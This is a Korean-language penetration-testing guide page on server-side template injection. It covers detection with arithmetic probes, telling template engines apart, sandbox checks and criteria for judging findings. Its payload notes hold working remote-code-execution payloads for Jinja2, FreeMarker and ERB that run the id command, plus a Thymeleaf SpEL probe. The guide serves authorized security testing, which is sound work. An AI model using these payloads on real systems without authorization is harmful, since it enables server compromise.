---
sidebar_position: 23
title: SSTI
description: 웹 진단 - SSTI 탐지, 템플릿 엔진 식별, 제한된 객체·명령 실행 확인, sandbox 점검 절차와 판정 기준
keywords: [SSTI, Server-Side Template Injection, Jinja2, Twig, FreeMarker, Thymeleaf, ERB, Sandbox Escape, OWASP A05, RCE]
draft: false
toc_max_heading_level: 3
---

> 사용자가 입력한 `{{7*7}}` 같은 문자열을 서버가 일반 글자가 아니라 템플릿 명령으로 실행하는지 확인한다.

## 점검 목적

이름, 메일 본문, 보고서, CMS 콘텐츠처럼 서버가 화면을 만들 때 사용하는 입력을 확인한다. 입력한 산술식이 서버에서 계산되면 SSTI 후보이며, 템플릿 엔진과 접근 가능한 객체를 식별해 실제 영향 범위를 판단한다.

산술식 평가만으로 원격 명령 실행(RCE)을 단정하지 않는다. 안전하게 제한된 템플릿 기능일 수 있으므로 객체·메서드 접근과 sandbox 적용 상태를 나눠 확인한다.

브라우저에서만 AngularJS 같은 표현식이 실행되면 클라이언트 측 템플릿 인젝션이므로 [XSS](./xss.md)에서 이어간다. 템플릿과 무관하게 OS 명령이 이어 붙는 경우는 [Command Injection](./command-injection.md) 범위다.

---

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **표현식 실행** | 입력한 계산식이 서버 응답에서 계산됨 | 서로 다른 계산식이 반복 평가되면 SSTI 원시점 확정 |
| **기존 구문 탈출** | 사용자 입력이 이미 만들어진 템플릿 구문 안에 들어감 | 닫는 기호 뒤 새 표현식이나 출력이 실행되면 취약 |
| **객체·메서드 접근** | 템플릿에 전달된 객체의 속성이나 함수를 호출할 수 있음 | 내부 정보 또는 부수 효과가 있는 메서드에 접근하면 영향 상승 |
| **제한 환경 우회** | 사용자용 템플릿 편집 기능에 sandbox·허용 목록이 적용됨 | 금지된 속성·메서드 접근이 재현될 때 취약 |

---

## 진단 절차

#### Step 1. 진입점 식별

서버가 사용자 입력을 이용해 새 화면이나 문서를 만드는 기능을 먼저 본다.

- 이름·닉네임이 들어간 인사말과 오류 메시지
- 이메일·알림·SMS 템플릿 미리보기
- PDF·보고서·청구서 생성
- CMS·위젯·페이지 빌더의 동적 콘텐츠
- 관리자가 직접 작성하는 템플릿 기능
- URL 값을 화면 이름이나 fragment로 사용하는 기능

저장 후 다른 화면·메일·파일에서 렌더링되는 입력은 즉시 응답만 보지 말고 최종 생성물까지 확인한다.

#### Step 2. 단순 출력과 서버 계산 구분

고유한 두 계산식을 순서대로 넣어 응답 원문을 비교한다.

```text
{{7*7}}  -> 49인지 확인
{{8*8}}  -> 64인지 확인
```

두 결과가 일관되게 계산돼야 한다. 브라우저 DOM이 아니라 Burp의 원본 HTTP 응답이나 생성된 메일·PDF에서 결과를 확인한다.

#### Step 3. 다른 템플릿 구문 비교

`{{ }}`가 그대로 출력되면 다음 구문을 하나씩 비교한다.

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
```

처음부터 여러 특수문자를 섞은 문자열을 보내면 오류 원인을 구분하기 어렵다. 산술식이 모두 불명확할 때만 `${{<%[%'"}}%\` 같은 혼합 문자열로 오류 단서를 찾는다.

#### Step 4. 템플릿 엔진 식별

응답 Header, 오류 메시지, 기술 스택과 구문별 결과를 함께 본다.

| 페이로드 | Jinja2 (Python) | Twig (PHP) | FreeMarker (Java) | Thymeleaf | ERB (Ruby) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `{{7*7}}` | 49 | 49 | (미반응) | (미반응) | (미반응) |
| `{{7*'7'}}` | `7777777` | `49` | 에러 | (미반응) | (미반응) |
| `${7*7}` | (미반응) | (미반응) | `49` | 표현식 위치에서만 가능 | (미반응) |
| `<%= 7*7 %>` | (미반응) | (미반응) | (미반응) | (미반응) | `49` |

한 개 결과만으로 엔진을 확정하지 않는다. 예를 들어 `{{7*7}}`은 Jinja2와 Twig에서 모두 계산될 수 있다.

#### Step 5. 접근 가능한 범위 확인

엔진과 버전을 좁힌 뒤 다음 순서로 영향 범위를 올린다.

1. 문자열·자료형 같은 비민감 객체 확인
2. 템플릿에 전달된 객체의 속성 접근
3. 금지된 속성에서 sandbox 차단 여부 확인
4. 스코프에 필요할 때만 `id`, `whoami` 같은 짧은 명령 실행

설정 전체, 환경 변수 전체, 파일 원문을 기본 페이로드로 출력하지 않는다.

#### Step 6. 결과를 단계별로 판정

| 확인 결과 | 판정 |
| :--- | :--- |
| 계산식만 평가됨 | SSTI 원시점 확정, 영향 추가 확인 |
| 내부 객체·메서드 접근 | 영향 상승 |
| `SecurityError` 등으로 금지 속성 차단 | sandbox 동작 후보 |
| 짧은 OS 명령 결과 반환 | RCE 확정 |
| 입력이 그대로 출력 | SSTI 미확정, XSS·단순 반사 확인 |

### 상황별 빠른 선택

| 현재 상황 | 먼저 할 테스트 |
| :--- | :--- |
| 이름·메일 본문이 서버 생성물에 표시됨 | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` 순서로 비교 |
| `{{7*7}}`이 `49`로 바뀜 | `{{7*'7'}}`로 Jinja2·Twig 분기 |
| Java·Spring 흔적이 있음 | `${7*7}`과 Thymeleaf view-name 조건 확인 |
| Ruby·Rails 흔적이 있음 | `<%= 7*7 %>` 확인 |
| 계산식은 되지만 속성 접근이 막힘 | sandbox 오류와 엔진 공식 보안 문서 확인 |
| 응답에는 없고 메일·PDF로 생성됨 | 최종 생성물에서 고유 계산 결과 확인 |

---

## 페이로드 노트

### 1. 엔진을 모를 때 기본 탐지

**이럴 때 사용**: 사용자 입력이 서버가 만든 HTML·메일·PDF에 표시되지만 템플릿 엔진은 모른다.

**바꿀 값**: 한 요청에 하나씩 넣는다.

```text
{{7*7}}
{{8*8}}
${7*7}
<%= 7*7 %>
{7*7}
```

**확인할 것**: `49`, `64`처럼 서로 다른 계산 결과가 서버 응답이나 최종 생성물에 일관되게 나타나는지 확인한다. 문자열이 그대로 나오면 SSTI가 아니라 단순 출력일 수 있다.

오류 응답에 `jinja2`, `Twig`, `freemarker`, `Thymeleaf`, `ERB`가 보이면 엔진 후보로 기록한다. 오류 한 번만으로 버전까지 단정하지 않는다.

### 2. Jinja2 / Flask

**이럴 때 사용**: `{{7*7}}`이 `49`, `{{7*'7'}}`이 `7777777`로 평가되거나 오류에 Jinja2·Flask 단서가 있다.

**바꿀 값**: 먼저 비민감 속성 접근 여부를 확인한다.

```text
{{ ''.__class__.__name__ }}
{{ request is defined }}
{{ config is defined }}
```

`str`, `True` 같은 결과가 나오면 산술식보다 넓은 객체 접근이 가능하다. `{{ config }}`나 `{{ request.environ }}`처럼 설정·환경 전체를 출력하는 페이로드는 기본 확인에서 사용하지 않는다.

스코프상 명령 실행 확인이 필요하고 일반 Jinja 환경으로 판단되면 짧은 단일 명령만 사용한다.

```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**확인할 것**: `uid=...` 같은 실행 사용자 정보가 응답에 나오면 RCE 확정이다. 실행 결과가 없거나 `SecurityError`가 나오면 Jinja sandbox 또는 노출 객체 제한을 확인한다.

Jinja의 `SandboxedEnvironment`는 밑줄로 시작하는 속성과 내부 속성을 기본적으로 제한한다. 인터넷의 우회 체인은 Jinja·Python 버전과 애플리케이션이 넘긴 객체에 따라 달라지므로, 무작정 대량 적용하지 않는다.

### 3. Twig / Symfony

**이럴 때 사용**: `{{7*7}}`과 `{{7*'7'}}`이 모두 `49`로 평가되고 PHP·Symfony·Twig 오류 단서가 있다.

**바꿀 값**: 먼저 Twig의 기본 표현식과 노출 변수만 확인한다.

```text
{{ 7*7 }}
{{ _self is defined }}
{{ app is defined }}
```

**확인할 것**: Twig 버전, 활성 extension, sandbox 정책에 따라 접근 가능한 함수와 filter가 크게 달라진다. `dump(app)`나 서버 변수 전체 출력은 기본 확인에서 피한다.

`registerUndefinedFilterCallback`, `sort('system')` 같은 공개 페이로드는 오래된 Twig나 특정 설정을 전제로 한다. 최신 Twig에 그대로 적용된다고 가정하지 말고 버전과 공식 sandbox 문서를 먼저 확인한다. 허용되지 않은 함수·filter가 sandbox에서 차단되면 그 결과만으로 우회 성공으로 보지 않는다.

### 4. FreeMarker

**이럴 때 사용**: `${7*7}`이 `49`로 평가되고 오류에 Java·FreeMarker 단서가 있다.

**바꿀 값**: 버전과 기본 객체 접근을 먼저 확인한다.

```text
${.version}
${7*7}
```

스코프상 명령 실행 확인이 필요할 때만 `Execute` 유틸리티 접근을 제한적으로 확인한다.

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**확인할 것**: `uid=...`가 나오면 RCE 확정이다. `?new()`가 차단되면 `TemplateClassResolver` 설정을 확인한다. `SAFER_RESOLVER`는 `Execute`와 일부 위험 class를 막고, `ALLOWS_NOTHING_RESOLVER`는 class 해석 자체를 막는다.

산술식이 평가된다는 사실과 `Execute`가 차단된다는 사실을 분리해 기록한다. 특정 유틸리티가 막혔다고 SSTI 원시점까지 사라지는 것은 아니다.

### 5. Thymeleaf / Spring

**이럴 때 사용**: 사용자 입력이 일반 변수 값이 아니라 view 이름, template 이름, URL fragment에 들어간다. 단순한 `th:text="${name}"` 변수 출력은 같은 조건이 아니다.

**바꿀 값**: view 이름에 사용자 입력이 이어 붙는 지점에서 전처리 표현식을 확인한다.

```text
__${7*7}__::.x
__${T(java.lang.System).getProperty('java.version')}__::.x
```

**확인할 것**: 응답이나 오류의 view 이름에 `49` 또는 Java 버전이 반영되면 서버의 Spring Expression Language(SpEL)가 평가된 것이다. 명령 실행은 이 원시점과 허용된 class·method 범위를 확인한 뒤 별도로 판단한다.

일반 폼 값에 `${7*7}`을 넣었는데 그대로 출력되는 경우는 Thymeleaf SSTI 증거가 아니다.

### 6. ERB / Ruby

**이럴 때 사용**: `<%= 7*7 %>`이 `49`로 평가되고 Ruby·ERB 오류 단서가 있다.

**바꿀 값**: 런타임 확인 후 필요한 경우 짧은 명령으로 올린다.

```erb
<%= RUBY_VERSION %>
<%= IO.popen('id').read %>
```

**확인할 것**: Ruby 버전이 반환되면 코드 표현식 접근, `uid=...`가 반환되면 RCE 확정이다. 파일 원문 읽기나 쓰기는 기본 확인에서 사용하지 않는다.

Rails의 일반 변수 출력만으로는 ERB SSTI가 되지 않는다. 사용자 입력을 `ERB.new(user_input).result`처럼 새 템플릿 원문으로 처리하는 흐름이 주요 대상이다.

### 7. sandbox와 키워드 필터 구분

**이럴 때 사용**: 산술식은 평가되지만 `__class__`, 함수 호출, class 생성 같은 동작이 차단된다.

먼저 오류와 차단 위치를 구분한다.

| 관찰 | 의미 |
| :--- | :--- |
| `SecurityError`, "not allowed" | 엔진 sandbox나 허용 목록 가능성 |
| 특정 단어에서만 동일 차단 화면 | 애플리케이션 필터·WAF 가능성 |
| 문법 오류와 stack trace | 엔진 구문 또는 버전 불일치 |
| `200`이지만 빈 값 | 미정의 변수 또는 출력되지 않는 반환값 가능성 |

Jinja2에서 점 표기만 필터링하는지 확인할 때는 같은 속성을 다른 문법으로 최소 비교할 수 있다.

```text
{{ ''.__class__.__name__ }}
{{ ''|attr('__class__')|attr('__name__') }}
```

**확인할 것**: 두 번째 표현만 동작하면 문자열·속성 필터 편차가 확인된다. 이것만으로 sandbox escape나 RCE를 확정하지 않는다. 금지된 메서드나 명령 실행까지 도달했을 때 영향 상승으로 판정한다.

### 8. 다른 엔진 빠른 분기

| 단서 | 기본 구문 | 다음 확인 |
| :--- | :--- | :--- |
| Mako / Python | `${7*7}` 또는 `<% ... %>` | Mako 공식 syntax와 노출 객체 |
| Velocity / Java | `#set($x=7*7)$x` | context에 전달된 tool·객체 |
| Smarty / PHP | `{7*7}` | Smarty 버전과 `{php}` 비활성화 여부 |
| Pug / Node.js | `#{7*7}` | interpolation이 서버에서 처리되는지 |
| Handlebars | `{{...}}` | 등록된 helper와 prototype 접근 제한 |

공개 payload collection은 엔진 후보와 버전을 좁힌 뒤 참고한다. 여러 엔진의 RCE 문자열을 한 번에 대량 적용하지 않는다.

### 9. 자동화 도구 참고

`tplmap`, Burp 확장, scanner는 진입점과 엔진 후보를 찾는 보조 도구다. 먼저 두 개의 산술식과 원본 응답으로 수동 재현한 뒤 사용한다.

- 요청 수와 오류 발생량을 제한한다.
- 도구가 보고한 RCE를 짧은 단일 요청으로 다시 검증한다.
- 지원 엔진·Python 버전·최근 유지보수 상태를 확인한다.

---

## 우회 매트릭스

| 관찰 | 다음 확인 |
| :--- | :--- |
| `{{7*7}}`이 그대로 출력 | `${7*7}`, `<%= 7*7 %>`, `{7*7}` 등 다른 엔진 구문 |
| 한 계산식만 `49`로 보임 | `{{8*8}}`처럼 다른 값으로 교차 검증 |
| 브라우저에서만 값이 바뀜 | 원본 HTTP 응답과 client-side framework 확인 |
| 모든 특수문자에서 `500` | 한 글자·한 구문씩 줄여 오류 지점과 stack trace 비교 |
| 산술식은 되지만 속성 접근 차단 | 엔진 sandbox·허용 목록·버전 공식 문서 확인 |
| 점 표기만 차단 | 엔진이 지원하는 bracket·filter 기반 속성 접근과 비교 |
| 특정 키워드만 차단 | 문자열 분할·인코딩보다 먼저 애플리케이션 필터인지 확인 |
| 응답 본문에 결과가 없음 | 메일·PDF·관리자 화면 등 최종 렌더링 위치 확인 |
| 명령 객체는 만들어지나 출력이 없음 | 반환값 출력 방법을 엔진 문서에서 확인하고 짧은 단일 명령 유지 |
| 공개 RCE 페이로드가 실패 | 엔진·버전·extension·노출 객체 조건을 다시 확인 |

---

## 취약 판정 기준

### 취약

- [ ] 서로 다른 산술식이 서버 응답이나 생성물에서 일관되게 계산됨
- [ ] 기존 템플릿 구문을 닫고 새 표현식이나 출력을 실행할 수 있음
- [ ] 템플릿에 전달된 내부 객체의 제한 속성·메서드에 접근할 수 있음
- [ ] sandbox가 금지한 속성·함수·class 접근을 우회할 수 있음
- [ ] `id`, `whoami` 같은 짧은 OS 명령 결과가 반환됨

### 후보 / 보류

- [ ] 입력이 그대로 출력되고 산술식 평가 여부는 확인되지 않음
- [ ] `49`가 한 번 보였지만 다른 계산식으로 재현되지 않음
- [ ] 오류에 템플릿 엔진 이름은 나오지만 사용자 표현식 실행은 확인되지 않음
- [ ] 산술식은 평가되지만 의도된 사용자 템플릿 기능이며 sandbox 경계를 넘지 못함
- [ ] 객체 이름은 확인되지만 실제 속성·메서드 접근은 차단됨
- [ ] 공개 RCE 페이로드가 실패했지만 엔진·버전·설정 조건은 확인하지 못함

### 영향 상승 조건

- [ ] 애플리케이션 설정이나 제한된 내부 값에 선택적으로 접근할 수 있음
- [ ] 파일 읽기·쓰기 또는 부수 효과가 있는 애플리케이션 메서드 호출이 가능함
- [ ] OS 명령 실행이 웹 애플리케이션 사용자 권한으로 재현됨
- [ ] 관리자용 템플릿이나 여러 렌더링 기능에서 같은 원시점이 확인됨

입력이 그대로 출력되면 SSTI 확정이 아니다. Thymeleaf의 일반 변수 출력처럼 템플릿 코드와 데이터가 분리된 정상 흐름도 있다. `49`가 우연한 업무 값인지 배제하려면 `8*8`, `9*9`처럼 값을 바꿔 재현한다.

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP Testing Guide - Testing for Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger - Exploiting SSTI to achieve remote code execution](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [Jinja - Sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [Twig - Sandbox](https://twig.symfony.com/doc/3.x/sandbox.html)
- [FreeMarker - TemplateClassResolver](https://freemarker.apache.org/docs/api/freemarker/core/TemplateClassResolver.html)
- [James Kettle - Server-Side Template Injection: RCE for the Modern Web App](https://portswigger.net/research/server-side-template-injection)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks - SSTI](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
